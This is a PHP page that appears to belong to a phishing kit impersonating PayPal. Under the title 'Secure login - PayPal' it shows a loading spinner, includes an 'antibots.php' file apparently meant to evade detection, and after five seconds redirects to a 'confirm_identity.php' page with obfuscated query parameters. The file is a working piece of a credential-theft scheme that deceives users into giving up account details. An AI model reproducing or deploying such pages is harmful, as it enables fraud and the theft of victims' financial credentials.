<?php

/*

 */

include 'antibots.php';



?>
<!DOCTYPE html>
<html>
<head>
    <title>Secure login - PayPal</title>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="refresh" content="5;url=confirm_identity.php?websrc=<?php echo md5('nOobAssas!n'); ?>&dispatched=userInfo&id=<?php echo rand(10000000000,500000000); ?>">
    <meta name="robots" content="noindex" />
    <link rel="icon" href="css/fav.ico" />
</head>
<style>
    body{
        background-color: #F8F8F8;
        margin: 0;
        font-family: arial, sans-serif;
    }
    .content-rot{
        width: auto;
        margin-left: auto;
        margin-right: auto;
    }
    .content{
        background: none repeat scroll 0% 0% #FFF;
        width: 765px;
        padding: 15px 117px;
        margin: 0 auto 25px;
        border-radius: 8px;
        box-shadow: 0px 1px 3px #A2A2A2;
    }
    .layout{
        text-align: center;
        margin: 65px 0 20px;
    }
    .layout h3{
        margin-bottom: 40px;
        font-size: 18px;
    }
    .layout p {
        color: #656565;
    }
    .layout p a{
        color: #656565;
    }
    .img_rotate{
        display: block;
        margin: auto auto;
        height:30px;
        width:30px;
        -webkit-animation: rotation .7s infinite linear;
        -moz-animation: rotation .7s infinite linear;
        -o-animation: rotation .7s infinite linear;
        animation: rotation .7s infinite linear;
        border-left:8px solid rgba(0,0,0,.20);
        border-right:8px solid rgba(0,0,0,.20);
        border-bottom:8px solid rgba(0,0,0,.20);
        border-top:8px solid rgba(33,128,192,1);
        border-radius:100%;
    }
    @keyframes rotation {
         from {transform: rotate(0deg);}
         to {transform: rotate(359deg);}
     }
    @-webkit-keyframes rotation {
        from {-webkit-transform: rotate(0deg);}
        to {-webkit-transform: rotate(359deg);}
    }
    @-moz-keyframes rotation {
        from {-moz-transform: rotate(0deg);}
        to {-moz-transform: rotate(359deg);}
    }
    @-o-keyframes rotation {
        from {-o-transform: rotate(0deg);}
        to {-o-transform: rotate(359deg);}
    }


</style>
<body>
<div class="content-rot">
    <div class="content">
        <div class="layout">
            <h3>A moment ...</h3>
            <div class="img_rotate"></div>
            <p>Page does not appear after a few seconds? <a href="#">try again</a></p>
        </div>
    </div>

</div>
</body>
</html>